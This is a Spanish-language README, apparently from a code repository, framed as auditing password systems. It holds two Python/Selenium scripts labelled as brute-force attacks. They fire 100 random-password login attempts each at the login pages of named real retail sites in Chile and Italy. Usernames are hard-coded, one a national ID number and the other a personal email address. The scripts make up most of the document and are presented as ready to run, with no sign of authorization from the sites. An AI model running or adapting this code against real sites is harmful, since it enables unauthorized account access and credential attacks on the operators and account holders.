# Automatización de credenciales con python y selenium
Auditar la implementación de los sistemas de creación, actualización, acceso, transmisión y recuperación de contraseñas

## Selenium 
Selenium es un entorno de pruebas que se utiliza para automatizar servicios de sowftware.

## Instalación
Usa el pip en la consola para instalar el paquete de selenium.

```bash
pip install selenium
```
## Ejemplo N°1 de uso de python con selenium (ataque fuerza bruta sitio web chileno)

```python
import string
import time
import random

#Carga el módulo webdriver para implementar las clases y métodos para el soporte de los diferentes navegadores
from selenium import webdriver

#Carga la configuración del teclado virtual para simular las entradas de teclado
from selenium.webdriver.common.keys import Keys

#Crea una instancia de Chrome que se pueda controlar con comandos de selenium.
driver = webdriver.Chrome()

#Llama a la página chilena, que será la base para las interacciones automatizadas
driver.get('https://www.wei.cl/cliente/ingreso')
time.sleep(5)
#variable que contendrá carácteres uppercase, lowercase y digitos del 0-9, es decir base 62
letters = string.ascii_letters + string.digits

#Inicia la automatiación de 100 accesos (verifica si el sitio web es susceptible a ataques por fuerza bruta) 
for x in range(100):

    #Se buscará dentro del sitio web los elementos que contengan un atributo name llamados ''client-username''
    usr = driver.find_element_by_id("client-username")
    usr.clear()
    #Se introduce el valor que contiene la variable usr
    usr.send_keys("20189579-0")
    #Se buscará dentro del sitio web los elementos que contengan un atributo name llamados ''client-password''
    psw = driver.find_element_by_id("client-password")
    str = ''.join(random.choice(letters) for i in range(random.randrange(6,10)))
    
    #Se introduce el valor que contiene la variable psw
    psw.send_keys(str)
    print(str)
    
    #Está variable permite efectuar un evento click a la página web mediante el xpath
    clk = driver.find_element_by_xpath('//*[@id="form-ingreso-window"]/button').submit()
    time.sleep(1)
    psw.clear()
```
## Ejemplo N°2 de uso de python con selenium (ataque fuerza bruta sitio web italiano)

```python
# -*- coding: utf-8 -*-
import string
import time
import random

#Carga el módulo webdriver para implementar las clases y métodos para el soporte de los diferentes navegadores
from selenium import webdriver

#Carga la configuración del teclado virtual para simular las entradas de teclado
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()
driver.get("https://www.ovs.it/login")
time.sleep(5)

#Declaración de variables asociadas a la base que sorporta el sitio web italiano.
base62 = string.ascii_letters + string.digits  
sub_s = "ₐ₈CDₑբGₕᵢⱼₖₗₘₙₒₚQᵣₛₜᵤᵥwₓᵧZₐ♭꜀ᑯₑբ₉ₕᵢⱼₖₗₘₙₒₚ૧ᵣₛₜᵤᵥwₓᵧ₂₀₁₂₃₄₅₆₇₈₉₊₋₌₍₎"
ascii_256 = "@#~¥§«Æ¼ñÑá^ø=()’\($þ”ßÐ‡‰―‼⁊‹¢"
arabic = "ء آ أ ؤ ئ ا ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ل م ن ه و ي ً ٌ ٍ َ ُ ِ ّ ْ ٔ ٰ ټ پ ځ څ چ ډ ړ ږ ژ ښ ک ګ گ ڼ ی ۍ ې ﭖ ﭗ ﭘ ﭙ ﭺ ﭻ ﭼ ﭽ ﮊ ﮋ ﮎ ﮏ ﮐ ﮑ ﮒ ﮓ ﮔ ﮕ ﯤ ﯥ ﯦ ﯧ ﯼ ﯽ ﯾ ﯿ ﺀ ﺍ ﺎ ﺏ ﺐ ﺑ ﺒ ﺓ ﺔ ﺕ ﺖ ﺗ ﺘ ﺙ ﺚ ﺛ ﺜ ﺝ ﺞ ﺟ ﺠ ﺡ ﺢ ﺣ ﺤ ﺥ ﺦ ﺧ ﺨ ﺩ ﺪ ﺫ ﺬ ﺭ ﺮ ﺯ ﺰ ﺱ ﺲ ﺳ ﺴ ﺵ ﺶ ﺷ ﺸ ﺹ ﺺ ﺻ ﺼ ﺽ ﺾ ﺿ ﻀ ﻁ ﻂ ﻃ ﻄ ﻅ ﻆ ﻇ ﻈ ﻉ ﻊ ﻋ ﻌ ﻍ ﻎ ﻏ ﻐ ﻑ ﻒ ﻓ ﻔ ﻕ ﻖ ﻗ ﻘ ﻝ ﻞ ﻟ ﻠ ﻡ ﻢ ﻣ ﻤ ﻥ ﻦ ﻧ ﻨ ﻩ ﻪ ﻫ ﻬ ﻭ ﻮ ﻱ ﻲ ﻳ ﻴ"
letters = base62 + sub_s + ascii_256 + arabic

#Inicia la automatiación de 100 accesos (verifica si el sitio web es susceptible a ataques por fuerza bruta) 
for x in range(100):

    #Se buscará dentro del sitio web los elementos que contengan un atributo name llamados ''login-form-email''
    usr = driver.find_element_by_id("login-form-email")
    usr.clear()
    usr.send_keys("espinabrayan@gmail.com")
    #Se buscará dentro del sitio web los elementos que contengan un atributo name llamados ''login-form-password''
    psw = driver.find_element_by_id("login-form-password")
    str = ''.join(random.choice(letters) for i in range(random.randrange(8,255)))
    #Se introduce el valor que contiene la variable psw
    psw.send_keys(str)
    print(str)
    #Está variable permite efectuar un evento submit a la página web mediante el xpath
    clk = driver.find_element_by_xpath("//*[@id='maincontent']/div/div/div[1]/div/div/div/form/button").submit()
    time.sleep(2)
    psw.clear()
driver.close()
```
